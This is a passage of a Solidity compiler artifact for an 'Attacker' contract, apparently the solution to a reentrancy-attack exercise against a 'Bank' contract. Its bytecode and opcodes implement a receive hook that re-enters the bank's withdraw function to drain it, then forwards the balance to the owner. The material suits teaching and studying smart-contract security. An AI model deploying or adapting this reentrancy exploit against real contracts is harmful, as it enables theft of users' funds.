\"#utility.yul\":3564:3637   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3639:3708   */\n    tag_82:\n      0x00\n        /* \"#utility.yul\":3701:3706   */\n      dup2\n        /* \"#utility.yul\":3690:3706   */\n      swap1\n      pop\n        /* \"#utility.yul\":3684:3708   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3710:3850   */\n    tag_67:\n      0x00\n        /* \"#utility.yul\":3800:3848   */\n      tag_103\n        /* \"#utility.yul\":3842:3847   */\n      dup3\n        /* \"#utility.yul\":3800:3848   */\n      tag_104\n      jump\t// in\n    tag_103:\n        /* \"#utility.yul\":3787:3848   */\n      swap1\n      pop\n        /* \"#utility.yul\":3781:3850   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3852:3968   */\n    tag_104:\n      0x00\n        /* \"#utility.yul\":3942:3966   */\n      tag_106\n        /* \"#utility.yul\":3960:3965   */\n      dup3\n        /* \"#utility.yul\":3942:3966   */\n      tag_99\n      jump\t// in\n    tag_106:\n        /* \"#utility.yul\":3929:3966   */\n      swap1\n      pop\n        /* \"#utility.yul\":3923:3968   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n\n    auxdata: 0xa26469706673582212203962707dfdff9d69599d5dbdf9e01e1a72956d11e37db6884c1e7679c642851964736f6c63430008000033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405234801561001057600080fd5b506040516107a33803806107a3833981810160405281019061003291906100cf565b816000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555080600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505050610154565b6000815190506100c98161013d565b92915050565b600080604083850312156100e257600080fd5b60006100f0858286016100ba565b9250506020610101858286016100ba565b9150509250929050565b60006101168261011d565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6101468161010b565b811461015157600080fd5b50565b610640806101636000396000f3fe6080604052600436106100595760003560e01c80630e29df2214610140578063300180e91461014a5780637362377b1461017557806376cdb03b1461018c5780638da5cb5b146101b7578063cd94f921146101e25761013b565b3661013b5760003373ffffffffffffffffffffffffffffffffffffffff163111156101035760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156100e657600080fd5b505af11580156100fa573d6000803e3d6000fd5b50505050610139565b7f6d128f203c67be3b2d9bf1612fd59bdd6ae01f4f0d2ffedd05e76ab2a09b7f8a60405161013090610533565b60405180910390a15b005b600080fd5b6101486101f9565b005b34801561015657600080fd5b5061015f61027c565b60405161016c9190610573565b60405180910390f35b34801561018157600080fd5b5061018a610284565b005b34801561019857600080fd5b506101a1610306565b6040516101ae9190610518565b60405180910390f35b3480156101c357600080fd5b506101cc61032a565b6040516101d991906104fd565b60405180910390f35b3480156101ee57600080fd5b506101f7610350565b005b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0346040518263ffffffff1660e01b81526004016000604051808303818588803b15801561026157600080fd5b505af1158015610275573d6000803e3d6000fd5b5050505050565b600047905090565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156102ec57600080fd5b505af1158015610300573d6000803e3d6000fd5b50505050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1647604051610398906104e8565b60006040518083038185875af1925050503d80600081146103d5576040519150601f19603f3d011682016040523d82523d6000602084013e6103da565b606091505b505090508061041e576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161041590610553565b60405180910390fd5b50565b61042a816105aa565b82525050565b610439816105e6565b82525050565b600061044c601b83610599565b91507f5468616e6b20796f7520666f7220796f7572206574686572203a2900000000006000830152602082019050919050565b600061048c600583610599565b91507f4552524f520000000000000000000000000000000000000000000000000000006000830152602082019050919050565b60006104cc60008361058e565b9150600082019050919050565b6104e2816105dc565b82525050565b60006104f3826104bf565b9150819050919050565b60006020820190506105126000830184610421565b92915050565b600060208201905061052d6000830184610430565b92915050565b6000602082019050818103600083015261054c8161043f565b9050919050565b6000602082019050818103600083015261056c8161047f565b9050919050565b600060208201905061058860008301846104d9565b92915050565b600081905092915050565b600082825260208201905092915050565b60006105b5826105bc565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b60006105f1826105f8565b9050919050565b6000610603826105bc565b905091905056fea26469706673582212203962707dfdff9d69599d5dbdf9e01e1a72956d11e37db6884c1e7679c642851964736f6c63430008000033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x7A3 CODESIZE SUB DUP1 PUSH2 0x7A3 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x32 SWAP2 SWAP1 PUSH2 0xCF JUMP JUMPDEST DUP2 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP DUP1 PUSH1 0x1 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP POP PUSH2 0x154 JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0xC9 DUP2 PUSH2 0x13D JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH2 0xE2 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH2 0xF0 DUP6 DUP3 DUP7 ADD PUSH2 0xBA JUMP JUMPDEST SWAP3 POP POP PUSH1 0x20 PUSH2 0x101 DUP6 DUP3 DUP7 ADD PUSH2 0xBA JUMP JUMPDEST SWAP2 POP POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x116 DUP3 PUSH2 0x11D JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x146 DUP2 PUSH2 0x10B JUMP JUMPDEST DUP2 EQ PUSH2 0x151 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH2 0x640 DUP1 PUSH2 0x163 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x59 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xE29DF22 EQ PUSH2 0x140 JUMPI DUP1 PUSH4 0x300180E9 EQ PUSH2 0x14A JUMPI DUP1 PUSH4 0x7362377B EQ PUSH2 0x175 JUMPI DUP1 PUSH4 0x76CDB03B EQ PUSH2 0x18C JUMPI DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0x1B7 JUMPI DUP1 PUSH4 0xCD94F921 EQ PUSH2 0x1E2 JUMPI PUSH2 0x13B JUMP JUMPDEST CALLDATASIZE PUSH2 0x13B JUMPI PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE GT ISZERO PUSH2 0x103 JUMPI PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x3CCFD60B PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xE6 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0xFA JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH2 0x139 JUMP JUMPDEST PUSH32 0x6D128F203C67BE3B2D9BF1612FD59BDD6AE01F4F0D2FFEDD05E76AB2A09B7F8A PUSH1 0x40 MLOAD PUSH2 0x130 SWAP1 PUSH2 0x533 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x148 PUSH2 0x1F9 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x156 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x15F PUSH2 0x27C JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x16C SWAP2 SWAP1 PUSH2 0x573 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x181 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x18A PUSH2 0x284 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x198 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x1A1 PUSH2 0x306 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x1AE SWAP2 SWAP1 PUSH2 0x518 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x1C3 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x1CC PUSH2 0x32A JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x1D9 SWAP2 SWAP1 PUSH2 0x4FD JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x1EE JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x1F7 PUSH2 0x350 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xD0E30DB0 CALLVALUE PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x261 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x275 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 SELFBALANCE SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x3CCFD60B PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x2EC JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x300 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SELFBALANCE PUSH1 0x40 MLOAD PUSH2 0x398 SWAP1 PUSH2 0x4E8 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP8 GAS CALL SWAP3 POP POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x3D5 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x3DA JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP SWAP1 POP DUP1 PUSH2 0x41E JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x415 SWAP1 PUSH2 0x553 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH2 0x42A DUP2 PUSH2 0x5AA JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH2 0x439 DUP2 PUSH2 0x5E6 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x44C PUSH1 0x1B DUP4 PUSH2 0x599 JUMP JUMPDEST SWAP2 POP PUSH32 0x5468616E6B20796F7520666F7220796F7572206574686572203A290000000000 PUSH1 0x0 DUP4 ADD MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x48C PUSH1 0x5 DUP4 PUSH2 0x599 JUMP JUMPDEST SWAP2 POP PUSH32 0x4552524F52000000000000000000000000000000000000000000000000000000 PUSH1 0x0 DUP4 ADD MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x4CC PUSH1 0x0 DUP4 PUSH2 0x58E JUMP JUMPDEST SWAP2 POP PUSH1 0x0 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x4E2 DUP2 PUSH2 0x5DC JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x4F3 DUP3 PUSH2 0x4BF JUMP JUMPDEST SWAP2 POP DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x512 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x421 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x52D PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x430 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x54C DUP2 PUSH2 0x43F JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x56C DUP2 PUSH2 0x47F JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x588 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x4D9 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x5B5 DUP3 PUSH2 0x5BC JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x5F1 DUP3 PUSH2 0x5F8 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x603 DUP3 PUSH2 0x5BC JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 CODECOPY PUSH3 0x707DFD SELFDESTRUCT SWAP14 PUSH10 0x599D5DBDF9E01E1A7295 PUSH14 0x11E37DB6884C1E7679C642851964 PUSH20 0x6F6C634300080000330000000000000000000000 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "320000",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"bank()": "1298",
						"chekcBalance()": "339",
						"giveMeEther()": "infinite",
						"owner()": "1280",
						"sendEther()": "infinite",
						"withdrawEther()": "infinite"
					}
				},
				"methodIdentifiers": {
					"bank()": "76cdb03b",
					"chekcBalance()": "300180e9",
					"giveMeEther()": "cd94f921",
					"owner()": "8da5cb5b",
					"sendEther()": "0e29df22",
					"withdrawEther()": "7362377b"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 96,
						"contract": "contracts/reentrancyAttack_solution2-1.sol:Attacker",
						"label": "bank",
						"offset": 0,
						"slot": "0",
						"type": "t_contract(Bank)89"
					},
					{
						"astId": 98,
						"contract": "contracts/reentrancyAttack_solution2-1.sol:Attacker",
						"label": "owner",
						"offset": 0,
						"slot": "1",
						"type": "t_address"
					}
				],
				"types": {
					"t_address": {
						"encoding": "inplace",
						"label": "address",
						"numberOfBytes": "20"
					},
					"t_contract(Bank)89": {
						"encoding": "inplace",
						"label": "contract Bank",
						"numberOfBytes": "20"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}